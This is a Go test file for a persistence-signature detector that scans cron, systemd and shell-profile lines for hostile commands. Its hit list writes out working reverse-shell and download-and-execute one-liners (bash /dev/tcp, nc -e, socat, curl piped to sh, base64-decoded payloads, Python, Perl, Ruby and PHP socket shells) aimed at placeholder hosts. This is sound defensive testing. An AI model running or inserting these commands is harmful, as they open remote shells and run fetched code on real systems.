package persistsig

import (
	"testing"

	"github.com/donaldsteele/telltale/internal/model"
)

func TestMatchLinePatterns(t *testing.T) {
	hits := []string{
		`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
		`exec 3<>/dev/udp/10.0.0.1/53`,
		`sh -i >& /dev/null 0>&1`,
		`/bin/bash -i 2>&1 | nc 10.0.0.1 4444`,
		`nc -e /bin/sh 10.0.0.1 4444`,
		`ncat --exec /bin/bash 10.0.0.1 4444`,
		`/usr/bin/netcat -lvp 4444 -c bash`,
		`NC.TRADITIONAL -e /bin/sh h 1`,
		`socat TCP:10.0.0.1:4444 EXEC:/bin/sh,pty,stderr`,
		`socat tcp-connect:h:1 system:'sh -i'`,
		`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f`,
		`curl -s http://x.example/a.sh | sh`,
		`curl -fsSL http://x.example/a.sh | sudo bash`,
		`wget -qO- http://x.example/a | /bin/bash -s`,
		`sh -c "$(curl -fsSL http://x.example/a)"`,
		"bash -c \"`wget -qO- http://x/a`\"",
		`bash <(curl -s http://x.example/a)`,
		`eval "$(curl -s http://x.example/a)"`,
		`echo cGF5bG9hZA== | base64 -d | sh`,
		`base64 --decode /tmp/p | bash`,
		`python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("h",1));subprocess.call(["/bin/sh"])'`,
		`python -c "import socket,os,pty;s=socket.socket();os.dup2(s.fileno(),0);pty.spawn('sh')"`,
		`perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);exec("/bin/sh -i")'`,
		`ruby -rsocket -e 'c=TCPSocket.new("h",1);exec "/bin/sh"'`,
		`php -r '$s=fsockopen("h",1);exec("/bin/sh -i <&3");'`,
		`* * * * * root curl -s http://x.example/a | sh`,
	}
	for _, l := range hits {
		if MatchLine(l) == "" {
			t.Errorf("no hit: %s", l)
		}
	}
	misses := []string{
		`curl -o /tmp/x https://example.com/file.tar.gz`,
		`wget -q https://example.com/list.txt -O /var/lib/list`,
		`nc -z host 22`,
		`nc -vz host 22`,
		`curl -s https://example.com/health | shasum -a 256`,
		`curl -s https://example.com/x | shuf -n1`,
		`bash -c 'echo hello'`,
		`sh -i`,
		`socat TCP-LISTEN:8080,fork TCP:localhost:80`,
		`echo cGF5 | base64 -d > /tmp/p`,
		`base64 /etc/hostname`,
		`python3 -c 'print(1)'`,
		`python3 /usr/lib/app/socket_check.py`,
		`python3 -c 'import socket; print(socket.gethostname())'`,
		`mkfifo /tmp/f`,
		``,
	}
	for _, l := range misses {
		if MatchLine(l) != "" {
			t.Errorf("false hit: %s", l)
		}
	}
}

func TestDetectQueryStringDoesNotHideShell(t *testing.T) {
	got := Detect(model.PersistKindCron, []string{"SHELL=/bin/sh", "* * * * * root curl http://evil.example/?a=1 | sh"})
	if len(got) != 1 || got[0].Line != 2 || got[0].Pattern != DownloadPipe {
		t.Errorf("got %+v", got)
	}
}

func TestDetectKindsLinesAndContinuations(t *testing.T) {
	if got := Detect(model.PersistKindHosts, []string{"nc -e /bin/sh h 1"}); got != nil {
		t.Errorf("hosts file scanned: %v", got)
	}
	if got := Detect(model.PersistKindCron, []string{"# nc -e /bin/sh h 1"}); got != nil {
		t.Errorf("comment: %v", got)
	}
	unit := []string{"Description=nc -e /bin/sh h 1", "ExecStart=/bin/bash -c 'exec 3<>\\", "/dev/tcp/h/1'"}
	if got := Detect(model.PersistKindSystemdUnit, unit); len(got) != 1 || got[0].Line != 2 {
		t.Errorf("unit: %v", got)
	}
	got := Detect(model.PersistKindCron, []string{"* * * * * root curl -s http://x/a \\", "  | sh"})
	if len(got) != 1 || got[0].Line != 1 {
		t.Errorf("continuation: %v", got)
	}
	if got := Detect(model.PersistKindProfile, []string{"# note \\", "echo | sh"}); got != nil {
		t.Errorf("comment continuation: %v", got)
	}
}
